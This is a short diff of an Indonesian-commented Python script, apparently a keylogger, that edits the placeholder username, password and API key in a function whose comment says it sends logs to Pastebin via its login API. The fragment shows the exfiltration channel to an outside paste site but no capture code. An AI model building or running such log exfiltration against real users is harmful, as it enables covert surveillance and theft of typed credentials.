@@ -67,9 +67,9 @@ class Key():
 
 # Fungsi untuk mengirim log ke Pastebin
 def plain_paste(title, contents):
-    username = "your_pastebin_username"  # Username akun Pastebin
-    password = "your_pastebin_password"  # Password akun Pastebin
-    api_dev_key = "your_pastebin_api_dev_key"  # API dev key dari Pastebin
+    username = "username"  # Username akun Pastebin
+    password = "password"  # Password akun Pastebin
+    api_dev_key = "pastebin_api_dev_key"  # API dev key dari Pastebin
 
     login_url = "https://pastebin.com/api/api_login.php"
     login_data = {
